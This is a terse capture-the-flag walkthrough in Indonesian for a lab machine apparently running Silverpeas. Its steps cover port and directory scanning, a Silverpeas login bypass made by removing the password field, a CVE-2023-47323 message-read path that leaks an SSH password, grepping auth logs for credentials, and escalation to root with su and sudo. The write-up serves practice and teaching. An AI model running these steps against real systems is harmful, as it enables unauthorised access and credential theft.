1. nmap biasa -> sudo nmap -sV -sV -p- ip -vv --min-rate 1000 | tee scan.txt
2. buka 8080 -> gobuster dir -u http://ip:8080 -w customwordlist.txt -> wordlist ada disitu
3. cari cve silverpeas -> https://github.com/advisories/GHSA-4w54-wwc9-x62c -> remove password field di burp
4. cari default cred -> silverpeas default credentials -> nanti jadiin username aja
5. cari cve lagi -> https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2023-47323
6. tambahin ini /silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=[masukin id 1 misal]
7. di id 6 nemu cred -> tim:cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol -> ssh aja kesitu
8. ls /var/log -> cat var/log/auth* | grep -i --text pass -> cari2 cred pass -> -i biar gapeduli lower upper
9. disitu ada cred postgreesql -> su tyler -> passwordnya itu coba
10. sudo su -> jadi root -> klaim /root
